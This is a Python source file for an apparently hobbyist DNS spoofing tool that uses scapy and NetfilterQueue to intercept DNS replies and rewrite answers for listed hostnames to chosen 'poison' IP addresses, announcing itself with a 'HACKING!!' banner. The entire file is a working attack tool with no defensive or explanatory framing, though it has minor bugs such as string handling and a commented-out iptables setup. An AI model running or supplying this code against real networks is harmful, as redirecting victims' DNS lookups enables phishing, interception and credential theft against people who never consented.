import sys
from scapy.all import *
import scapy.all as scapy
import socket
from netfilterqueue import NetfilterQueue
import subprocess
import threading

args = sys.argv

print("#######################################")
print("#######################################")
print("HACKING!!")
print("#######################################")
print("#######################################")

command1 = [
    'iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num' ,'0'
]
command2 = [
    'iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num' ,'0'
]

flag = 0
interface = ""
hostnames = ""
expression = ""
count = 0
for argct in range(len(args)-1):
    argcount = argct + 1
    if flag != 1:
        if args[argcount].lower() == '-i':
            #interface argument
            flag = 1
            interface = args[argcount+1]
        
        elif args[argcount].lower() == '-f':
            #tracefile argument
            flag = 1
            hostnames = args[argcount+1]

        else:
            expression = args[argcount]
    else:
        flag = 0

if interface == "":
    interface = "eth0"

hostnamesArr = []
poisonIPDict = {}
i = 0
if hostnames != "":
    f = open(hostnames)
    line = f.readline()
    i = 0
    while line:
        linesplit = line.split()
        print("i : " + str(i))
        print(linesplit)
        hostnamesArr.append(linesplit[1])
        poisonIPDict[linesplit[1]] = linesplit[0]
        i = i + 1
        line = f.readline()
    f.close()

def subprocess_call(command):
    call = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = call.stdout.read()
    error = call.stderr.read()
    if error.__len__() != 0:
        print("ERROR: " + error.decode())
        return False
    else:
        print("OUTPUT: " + output.decode())
        return True

# This function sniffs and modify packets with list of hostnames and victim's IP addresses
def callback(packet):
    pkt = scapy.IP(packet.get_payload())
    if pkt.haslayer(scapy.DNSRR):
        qname = pkt[scapy.DNSQR].qname
        print("Qname: " + qname)
        print("HOSTNAMES: " + str(hostnamesArr))
        print("check hostanem: " + str(check_hostname(qname)))
        if check_hostname(qname):
            print("Poisoning...")
            packet.set_payload(str(modify_response(pkt)))
    packet.accept()

def modify_response(pkt):
    print("RRNAME: " + pkt[scapy.DNSQR].qname)
    print("RDATA: " + match_victim_ip(pkt[scapy.DNSQR].qname))
    answer = scapy.DNSRR(rrname=pkt[scapy.DNSQR].qname, rdata=match_victim_ip(pkt[scapy.DNSQR].qname))
    pkt[scapy.DNS].an = answer
    pkt[scapy.DNS].ancount = 1
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.UDP].len
    del pkt[scapy.UDP].chksum
    return pkt

def match_victim_ip(hostname):
    if hostnames != "":
        return poisonIPDict[hostname]
    else:
        host = socket.gethostname()
        return socket.gethostbyname(host)

def check_hostname(qname):
    if hostnames == "": 
        return True
    else:
        for a in hostnamesArr:
            if a in qname:
                return True
        return False

# if subprocess_call(command1):
#     if subprocess_call(command2):
#         try:
#             queue = NetfilterQueue()
#             queue.bind(0, callback)
#             queue.run()
#         except Exception as error:
#             print("EXCEPTION " + error)

try:
    queue = NetfilterQueue()
    queue.bind(0, callback)
    queue.run()
except Exception as error:
    print("EXCEPTION " + error)
